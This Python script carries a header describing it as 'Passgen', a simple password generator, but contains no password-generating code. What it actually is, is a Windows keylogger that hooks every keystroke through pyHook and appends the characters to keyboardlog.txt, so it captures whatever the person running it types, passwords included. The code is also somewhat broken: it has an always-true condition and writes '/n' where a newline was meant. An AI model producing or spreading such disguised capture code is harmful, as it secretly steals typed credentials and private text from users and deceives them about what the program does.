#! /usr/bin/python
#
#   Passgen
#
#   Simple password generator written in Python
#
#   Copyright 2014, Michael Horka
#
#   THIS SOFTWARE IS PROVIDED "AS IS" WITHOUT ANY WARRANTY.
#   IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DAMAGES WHATSOEVER OR
#   PERFORMANCE OF THIS SOFTWARE.
#

import sys
import pythoncom
import pyHook

buffer = ''


def OnKeyboardEvent(event):
    if event.Ascii == 5:
        sys.exit()
    if event.Ascii != 0 or 8:
        f = open('keyboardlog.txt', 'a')
        keylogs = chr(event.Ascii)
    if event.Ascii == 13:
        keylogs += '/n'
    f.write(keylogs)
    print(keylogs)
    f.close()


def main():
    while True:
        hm = pyHook.HookManager()
        hm.KeyDown = OnKeyboardEvent
        hm.HookKeyboard()
        pythoncom.PumpMessages()


if __name__ == "__main__":
    main()